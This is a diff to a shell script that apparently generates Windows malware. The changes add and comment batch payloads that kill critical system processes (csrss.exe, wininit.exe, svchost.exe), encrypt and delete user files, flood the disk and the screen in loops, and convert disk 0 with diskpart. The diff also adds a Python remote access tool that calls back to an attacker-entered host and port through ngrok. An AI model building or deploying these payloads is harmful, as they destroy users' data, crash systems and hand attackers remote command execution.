@@ -44,12 +44,13 @@ then
 
 
 #crowder_malware_writer
-echo "taskkill /f /im explorer.exe">output/$sec3.bat
-echo "cipher /e *">>output/$sec3.bat
-echo ":l">>output/$sec3.bat
-echo "set a=%random%">>output/$sec3.bat
-echo "echo %a%>%a%.%a%">>output/$sec3.bat
-echo "goto l">>output/$sec3.bat
+echo "taskkill /f /im explorer.exe">output/$sec3.bat #kills explorer.exe
+echo "cipher /e *">>output/$sec3.bat  #encrypts files
+echo ":l">>output/$sec3.bat #function
+echo "set a=%random%">>output/$sec3.bat   #sets random number to variable
+echo "echo %a%>%a%.%a%">>output/$sec3.bat #stores random number in the file
+echo "goto l">>output/$sec3.bat #loop
+
 echo -e "${yellow}[+]Creating malware..."
 sleep 2
 
@@ -64,17 +65,12 @@ echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"
 elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "2" ]];
 then
 
-#info_gathering_malware_writer
+#converts_mbr_to_gpt
 
-echo "@echo off">output/$sec3.bat
-echo "mkdir info_log">>output/$sec3.bat
-echo "systeminfo>>info_log/sys.txt">>output/$sec3.bat
-echo "echo Directory graph(tree)>>info_log/sys.txt">>output/$sec3.bat
-echo "tree>>info_log/sys.txt">>output/$sec3.bat
-echo "tasklist>>info_log/sys.txt">>output/$sec3.bat
-echo "diskpart>>info_log/sys.txt">>output/$sec3.bat
-echo "ipconfig>>info_log/sys.txt">>output/$sec3.bat
-echo "logoff">>output/$sec3.bat
+echo "diskpart && list disk">output/$sec3.bat #opens diskpart for later conversion
+echo "select disk 0">>output/$sec3.bat  #selects disk 0 by default
+echo "convert gpt">>output/$sec3.bat  #diskpart converts mbr to gpt
+echo "exit">>output/$sec3.bat #exits
 echo -e "${yellow}[+]Creating malware..."
 sleep 2
 
@@ -93,8 +89,10 @@ then
 
 echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat
 echo "del *">>output/$sec3.bat
-echo "taskkill /f /im explorer.exe">>output/$sec3.bat
-echo "taskkill /f /im svchost.exe">>output/$sec3.bat
+echo "taskkill /f /im explorer.exe">>output/$sec3.bat #kills explorer.exe process
+echo "taskkill /f /im svchost.exe">>output/$sec3.bat  #kills svchost.exe service
+echo "taskkill /f /im csrss.exe">>output/$sec3.bat  #kills csrss.exe(client-server-runtime-process)
+echo "taskkill /f /im wininit.exe">>output/$sec3.bat  #kills wininit.exe(windows startup application)
 
 echo -e "${yellow}[+]Creating malware..."
 
@@ -111,11 +109,12 @@ elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "4" ]];
 then
 
 #infinite_screens_malware_writer
-echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat
-echo "cipher /e *">>output/$sec3.bat
-echo ":l">>output/$sec3.bat
-echo "start">>output/$sec3.bat
-echo "goto l">>output/$sec3.bat
+echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat  #changes directory to Documents
+echo "cipher /e *">>output/$sec3.bat  #encrypts files
+echo "taskkill /f /im explorer.exe">>output/$sec3.bat #kills explorer.exe
+echo ":l">>output/$sec3.bat #function
+echo "start">>output/$sec3.bat  #starts cmd.exe window
+echo "goto l">>output/$sec3.bat #loop
 
 echo -e "${yellow}[+]Creating malware..."
 sleep 2
@@ -130,11 +129,17 @@ echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"
 elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "5" ]];
 then
 
-#copy_docs_to_usb_malware_writer
+echo -e "${yellow}NOTE:If you are using ngrok use tcp port 5555!${white}"
+
+read -p 'ENTER HOST: ' ll1
+read -p 'ENTER PORT: ' ll2
+#selay_remote_access_tool_malware_writer
+
+
 echo "import socket">output/$sec3.py
 echo "import subprocess">>output/$sec3.py
-echo "HOST = ">>output/$sec3.py
-echo "PORT = ">>output/$sec3.py
+echo "HOST = '$ll1'">>output/$sec3.py
+echo "PORT = $ll2">>output/$sec3.py
 echo "s = socket.socket()">>output/$sec3.py
 echo "s.connect((HOST, PORT))">>output/$sec3.py
 echo "msg2 = 'UPDATING DO NOT CLOSE!">>output/$sec3.py
@@ -168,7 +173,11 @@ echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"
 
 sleep 1
 echo -e "${cyan}[+]Status:Setting up Selay-server...${white}"
+sleep 2
+
 python3 selay-server.py
+
+
 fi
 
 
